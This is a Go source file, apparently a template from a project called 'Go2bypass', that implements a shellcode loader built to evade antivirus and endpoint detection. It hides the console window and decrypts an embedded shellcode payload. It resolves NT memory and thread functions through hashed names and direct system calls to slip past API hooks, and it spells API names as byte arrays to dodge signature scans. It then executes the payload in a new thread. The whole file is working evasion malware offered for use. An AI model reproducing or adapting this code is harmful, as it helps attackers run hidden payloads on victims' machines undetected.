//good
package main

import (
	Go2public "Go2bypass/Public"
	_ "embed"
	"fmt"
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"os"
	"syscall"
	"unsafe"
)

//go:embed CodeToStringShell.txt
var CodeToStringShell string

var ApiDe Go2public.ApiEDcrypt
var CodeEnContent Go2public.CodToshellKey

func main() {
	/******HideConsole******/
	Go2public.Peels()
	CodeEnContent.KeyKey = `/******KeyKey******/`
	CodeEnContent.CodeToStringShell = CodeToStringShell
	/******DecodeType******/
	sc, err := ApiDe.CodeToShellDncrypt(CodeEnContent)
	if err != nil {
		os.Exit(0)
	}
var thisThread = uintptr(0xffffffffffffffff)
	alloc, e := Go2gabh.GetSSNByNameExcept(Go2public.Str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Go2public.Str2sha1)
	if e != nil {
		panic(e)
	}
	protect, e := Go2gabh.GetSSNByNameExcept(Go2public.Sha256Hex(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Go2public.Sha256Hex)
	if e != nil {
		panic(e)
	}
	ctd, e := Go2gabh.GetSSNByNameExcept(Go2public.Sha256Hex(string([]byte{'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x'})), Go2public.Sha256Hex)
	if e != nil {
		panic(e)
	}
	pWFSlObt, _, e := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),Go2public.Str2sha1(string([]byte{'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't'})), Go2public.Str2sha1)
	if e != nil {
		panic(e)
	}
	createThread(sc, thisThread, uint16(alloc), uint16(protect), uint16(ctd), pWFSlObt)
}

func createThread(sc []byte, handle uintptr, alloc, protect, ctd uint16, pWFSlObt uint64) {
	const (
		mt = uintptr(0x00001000)
		me = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(sc))
	r1, r := Go2gabh.HgSyscall(
		alloc,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(mt|me),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	Go2public.Cpymem(baseA, sc)

	var oldprotect uintptr
	r1, r = Go2gabh.HgSyscall(
		protect,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = Go2gabh.HgSyscall(
		ctd,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		handle,
		baseA,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)
	syscall.Syscall(uintptr(pWFSlObt), 2, hhosthread, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}